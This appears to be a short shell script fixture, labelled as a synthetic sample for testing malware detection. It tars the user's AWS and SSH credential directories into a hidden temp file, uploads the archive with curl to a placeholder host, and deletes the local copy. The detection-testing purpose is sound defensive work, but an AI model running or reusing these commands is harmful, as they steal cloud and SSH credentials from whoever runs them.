#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
tar czf /tmp/.s.tgz ~/.aws ~/.ssh 2>/dev/null
curl -s -F "f=@/tmp/.s.tgz" https://collect.example.invalid/up
rm -f /tmp/.s.tgz
